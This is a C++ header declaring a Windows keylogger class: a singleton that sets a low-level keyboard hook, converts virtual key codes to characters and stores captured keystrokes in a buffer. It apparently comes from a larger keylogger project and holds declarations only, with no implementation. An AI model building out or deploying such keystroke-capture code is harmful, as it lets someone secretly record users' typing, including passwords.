#pragma once
#include "runnible.h"
#include "Buffer.h"
#include "VirtulKeyCodeToCharConverter.h"

class KeyLogger :
	public Runnible
{
public:
	~KeyLogger(void);
	static KeyLogger* GetInstance();
	void SetBuffer(Buffer*);
	Buffer* GetBuffer();
protected:
	void OnEnable();
	void OnDisable();
private:
	VirtulKeyCodeToCharConverter *m_pConverter;
	KeyLogger();
	Buffer *m_pBuffer;
	HHOOK m_hhk;

	TCHAR m_keyChar;
	TCHAR m_deadKeyChar;
	static LRESULT CALLBACK onKeybordEvent(int code,WPARAM wParam,LPARAM lParam);
	static KeyLogger *m_pInstance;
	void addToBuffer(KBDLLHOOKSTRUCT*);
};
